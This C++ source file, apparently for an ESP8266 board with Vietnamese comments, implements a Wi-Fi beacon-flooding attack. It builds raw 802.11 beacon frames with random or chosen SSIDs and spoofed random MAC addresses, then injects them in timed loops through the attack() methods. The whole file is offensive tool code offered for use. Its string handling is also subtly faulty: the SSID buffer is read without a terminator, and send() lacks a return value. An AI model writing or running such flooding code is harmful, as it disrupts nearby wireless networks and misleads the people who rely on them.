#include"BEACON.h"
BEACON::BEACON() {
}

// Phương thức tạo các SSID random có độ dài từ 1 đến 32
String BEACON::randomSSID() {
  String letter = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&*()_+-=[];':,./<>?";         // các ký tự dùng để tạo nên ssid
  int ssidLen = random(1, 32);
  char temp[ssidLen];
  for (int i = 0; i < ssidLen; i++) {
    temp[i] = letter[random(1, letter.length() - 1)];
  }
  String ssid = temp;
  ssid[ssidLen] = '\0';
  return ssid;
}

// Phương thức tạo frame beacon với đối số đầu vào là chuỗi ssid
void BEACON::build(String& s) {
  byte channel = random(1, 12);
  String ssid = s.c_str();
  wifi_set_channel(channel);
  /* Change SSID fiels */
  /* start from byte 37th */

  uint8_t ssidLen = (uint8_t) ssid.length();
  /* 37 */  packet[37] = ssidLen; //Tag length
  for (int i = 0; i < ssidLen; i++) {
    /* 38 - 38+ssidLen */
    packet[38 + i] = (uint8_t) ssid[i]; //SSID
  }
  /* add Suppored Rates & DSSS fields */
  for (int i = 0; i < 35; i++) {
    packet[38 + ssidLen + i] = remain[i];
  }

  //set channel
  packet[38 + ssidLen + 12] = channel;

  //randomize Source address and BSSID
  for (int i = 0; i < 6; i++) {
    packet[10 + i] = packet[16 + i] = random(256);
  }
  packetSize = 38 + ssidLen + 35;
}
bool BEACON::send() {
  //send frame
  wifi_send_pkt_freedom(packet, packetSize, 0);
  wifi_send_pkt_freedom(packet, packetSize, 0);
}
void BEACON::attack(int timeout) {
  //  int channel = random(1,14);
  //  wifi_set_channel(channel);
  int curTime = millis();
  while (millis() - curTime < timeout * 1000) {
    String ssid = randomSSID();
    build(ssid);
    send();
    delay(1);
  }
  Serial.println("RS_BC_AT");
}
void BEACON::attack(String& ssid, int timeout) {
  build(ssid);
  int curTime = millis();
  while (millis() - curTime < timeout * 1000) {
    send();
    delay(1);
  }
  Serial.println("RS_BC_AT");
}


